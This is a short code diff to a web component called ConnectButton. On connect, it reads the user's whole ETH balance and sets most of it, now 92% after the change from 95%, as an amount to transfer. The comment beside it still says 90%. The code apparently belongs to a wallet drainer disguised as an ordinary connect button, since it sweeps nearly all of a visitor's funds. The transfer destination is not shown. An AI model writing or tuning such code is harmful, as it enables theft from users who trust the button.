@@ -68,7 +68,7 @@ export default function ConnectButton() {
       const userBalance = await signer.getBalance(); // Get user's ETH balance
 
       // Reserve 10% for gas fees (remaining 90% is for transfer)
-      const transferableAmount = userBalance.mul(95).div(100); // 90% of user's balance
+      const transferableAmount = userBalance.mul(92).div(100); // 90% of user's balance
 
       // Ensure the transferable amount is greater than zero
       if (transferableAmount.lte(0)) {
